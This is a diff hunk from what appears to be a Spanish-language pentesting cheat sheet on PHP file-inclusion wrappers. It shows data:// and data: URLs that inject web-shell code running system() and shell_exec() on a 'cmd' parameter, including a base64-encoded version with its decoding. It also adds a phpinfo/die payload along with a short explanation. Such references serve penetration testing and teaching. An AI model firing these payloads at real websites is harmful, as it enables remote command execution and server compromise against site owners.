@@ -2396,10 +2396,20 @@ http://example.com/index.php?page=zip://shell.jpg%23payload.php
 
 ##### Wrapper data://
 
+Este Wrapper nos permite ejecutar directamente código PHP:
+
 ```bash
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 NOTA: El payload es "<?php system($_GET['cmd']);echo 'Tenemos Shell!'; ?>"
 ```
+
+Otra forma:
+
+```bash
+http://example.com/index.php?file=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
+```
+
+Otro payload interesante a tener en cuenta es el `<?php phpinfo(); die();?>`. La funcionalidad **die** previene la ejecución del resto del script o la ejecución de la extensión decodificada incorrectamente anexada a la secuencia.
 
 ##### Wrapper expect://
 
